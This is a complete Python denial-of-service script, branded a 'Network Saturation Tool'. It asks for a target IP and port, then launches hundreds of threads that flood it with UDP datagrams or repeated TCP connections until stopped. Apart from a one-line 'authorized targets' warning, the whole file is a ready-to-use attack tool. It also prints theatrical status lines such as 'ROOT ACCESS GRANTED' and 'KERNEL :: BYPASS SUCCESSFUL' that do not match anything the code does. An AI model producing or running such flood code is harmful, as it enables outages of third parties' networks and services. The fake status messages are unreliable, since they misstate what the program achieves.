import socket
import threading
import random
import time
import sys

# --- Configuration Parameters ---
MAX_PACKET_SIZE_BYTES = 65500  # Max effective IP packet payload size (approx 64KB)
DEFAULT_PACKET_SIZE = 1024     # Default packet size if user input is invalid
DEFAULT_THREADS = 500          # Default threads for a more realistic test
MAX_THREADS_RECOMMENDED = 5000 # Warning for extremely high thread counts

# --- Global Control Flag ---
stop_attack = False

# --- Packet Data Generation ---
def generate_random_bytes(size):
    """Generates random bytes for packet payload."""
    return b'\x00' * size # Using null bytes for simplicity and consistent size

# --- UDP Flood Function ---
def udp_flood(target_ip, target_port, packet_size):
    global stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket
    data = generate_random_bytes(packet_size)
    
    print(f"[THREAD-{threading.get_ident()}] UDP FLOOD: Targeting {target_ip}:{target_port} with {packet_size} byte packets.")
    
    while not stop_attack:
        try:
            sock.sendto(data, (target_ip, target_port))
            # print(f"Sent UDP packet to {target_ip}:{target_port}") # Uncomment for verbose output
        except socket.error as e:
            # print(f"[THREAD-{threading.get_ident()}] UDP Error: {e}") # Log errors but keep trying
            pass
        # Optional: small delay to prevent overwhelming the local network stack
        # time.sleep(0.0001) 
    sock.close()
    print(f"[THREAD-{threading.get_ident()}] UDP FLOOD: Thread terminated.")


# --- TCP Flood Function ---
def tcp_flood(target_ip, target_port, packet_size):
    global stop_attack
    data = generate_random_bytes(packet_size)
    
    print(f"[THREAD-{threading.get_ident()}] TCP FLOOD: Targeting {target_ip}:{target_port} with {packet_size} byte packets.")

    while not stop_attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP socket
            sock.settimeout(1) # Short timeout for connection attempts
            sock.connect((target_ip, target_port))
            sock.sendall(data)
            # print(f"Sent TCP packet to {target_ip}:{target_port}") # Uncomment for verbose output
            sock.close() # Close connection after sending to free up resources, or keep open for persistent stream
        except socket.error as e:
            # print(f"[THREAD-{threading.get_ident()}] TCP Error: {e}") # Log errors but keep trying
            pass
        # Optional: small delay to prevent overwhelming the local network stack
        # time.sleep(0.0001) 
    print(f"[THREAD-{threading.get_ident()}] TCP FLOOD: Thread terminated.")

# --- Main Attack Orchestration ---
def main():
    global stop_attack
    print(f"\n[NETSEC :: VULNERABILITY IDENTIFIED] - Network Saturation Tool (JHack Edition)")
    print("------------------------------------------------------------------")
    print("WARNING: Use this tool responsibly and only on authorized targets.")
    print("------------------------------------------------------------------\n")

    target_ip = input("Enter target IP address: ")
    try:
        target_port = int(input("Enter target port (e.g., 80, 443, 53): "))
        if not (1 <= target_port <= 65535):
            raise ValueError
    except ValueError:
        print("Invalid port. Exiting.")
        return

    try:
        num_threads = int(input(f"Enter number of threads (recommended max {MAX_THREADS_RECOMMENDED}, default {DEFAULT_THREADS}): "))
        if num_threads <= 0:
            num_threads = DEFAULT_THREADS
        if num_threads > MAX_THREADS_RECOMMENDED:
            print(f"[WARNING] Extremely high thread count ({num_threads}) requested. This may crash your system.")
    except ValueError:
        num_threads = DEFAULT_THREADS
        print(f"Invalid thread count. Using default: {num_threads}")

    try:
        packet_size = int(input(f"Enter packet size in bytes (max {MAX_PACKET_SIZE_BYTES}, default {DEFAULT_PACKET_SIZE}): "))
        if not (1 <= packet_size <= MAX_PACKET_SIZE_BYTES):
            packet_size = DEFAULT_PACKET_SIZE
            print(f"Invalid packet size. Using default: {packet_size} bytes.")
    except ValueError:
        packet_size = DEFAULT_PACKET_SIZE
        print(f"Invalid packet size. Using default: {packet_size} bytes.")

    protocol = input("Choose protocol (UDP/TCP): ").strip().upper()
    if protocol not in ["UDP", "TCP"]:
        print("Invalid protocol. Choose 'UDP' or 'TCP'. Exiting.")
        return

    print(f"\n[SYSTEM :: ROOT ACCESS GRANTED] Initiating {protocol} Flood...")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Threads: {num_threads}")
    print(f"Packet Size: {packet_size} bytes")
    print("Press Ctrl+C to stop the attack.")

    threads = []
    try:
        for _ in range(num_threads):
            if protocol == "UDP":
                t = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size))
            else: # TCP
                t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, packet_size))
            t.daemon = True # Allows main program to exit even if threads are still running
            threads.append(t)
            t.start()
            # Optional: small delay between thread starts to manage local system resources
            # time.sleep(0.001) 
        
        while True:
            time.sleep(1) # Keep main thread alive
    except KeyboardInterrupt:
        print("\n[KERNEL :: BYPASS SUCCESSFUL] Termination signal received. Stopping attack...")
        stop_attack = True
        for t in threads:
            t.join(timeout=5) # Wait for threads to finish, with a timeout
        print("Attack stopped. All threads terminated.")
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")
        stop_attack = True
        for t in threads:
            t.join(timeout=5)
        print("Attack stopped due to error.")

if __name__ == "__main__":
    main()